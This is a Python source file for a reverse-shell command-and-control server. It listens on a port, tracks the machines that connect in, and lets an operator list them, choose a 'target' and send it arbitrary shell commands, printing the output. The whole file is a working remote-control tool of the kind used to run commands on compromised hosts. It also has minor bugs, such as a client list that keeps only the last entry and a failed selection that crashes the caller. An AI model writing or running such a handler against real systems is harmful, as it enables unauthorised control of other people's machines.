import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

# will contain list of connection object of all clients
all_connections = []

# will contain addess(IP and port) of clients
all_address = []









# Socket creation
def create_socket():
    try:
        global host
        global port
        global s  # for socket variable
        host = "" # If the server is hosted somewhere on internet then that IP will be given here
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print(str(msg))


# Bindng the socket and listening to connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding port=>" + str(port))
        # Binding the port and host together
        s.bind((host, port))
        s.listen(5) # 5 represents no. of bad connection it can tolerate before throwing an error

    except socket.error as msg:
        print(str(msg) + "\n" + "Retrying")
        bind_socket()



# closing previous connections if server.py is restarted (In one thread) and accepting new connections
def accepting_connection():
    # Close all the existing connections
    for c in all_connections:
        c.close()
    # delete all the elements from the list after closing connection
    del all_connections[:]
    del all_address[:]
    while (True):
        try:
            conn, address = s.accept() # returns connection object and address (IP and Port)
            s.setblocking(True)  # prevents timeout from happening on inactivity

            #Appending new client info  to all_connections and all_address array
            all_connections.append(conn)
            all_address.append(address)

            print("Connection established => " + address[0]) #address[0] gives the port no. here
            print("JDPrompt> ", end="") # My own terminal starts


        except:
            print("Error accepting connections")

# In other thread

def start_JDPrompt():
    while True:
        cmd = input("JDPrompt> ")
        if cmd == 'list': # List all the clients
            list_connections()

        elif 'select' in cmd: # select 0 command(will select 0th client) , select 1 command(will select 1st client) and so on
            conn, target = get_target(cmd)
            if conn is not None: #If the connection is successful
                send_target_commands(conn, target)
        elif cmd == 'quit':
            print("...Thank you for using 😀...")
        else:
            print("Command not found")


def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' ')) # Dummy string send to ensure client is connected
            conn.recv(201480) # receive connection from client
        except:
            #If connection is not sucessful then delete the info at that index
            del all_connections[i]
            del all_address[i]
            continue

        #Append all the clients info to result string
        results = str(i) + "    " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"

    #Display on the console
    print("...........Clients.........." + "\n" +"SNo."+"     "+"IP"+"       "+"  Port"+"\n"+ results +"\n"+".............................")


# selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # removes 'select ' and replaces withe empty string to get the id(0,1,2...) of the connection
        target = int(target) #Converting it to string
        conn = all_connections[target] # getting the connection object from the list and assign it to conn
        print("You are connected to " + str(all_address[target][0]))
        return conn, target
    except:
        print("Selection not valid")
        return None


def send_target_commands(conn, target):

    while True:
        try:
            input_string = all_address[target][0]+"> "
            cmd = input(input_string) #Take the command to perform operation on the system of input_string's IP
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd)) #Send the encoded command to client
                client_response = str(conn.recv(20480), "utf-8")  #Cliend sends back the response and converts it in string
                print(client_response)
        except:
            print("Error sending commands")
            break


# Create worker threads
def crate_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_JDPrompt()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


#Calling the functions
crate_workers()
create_jobs()
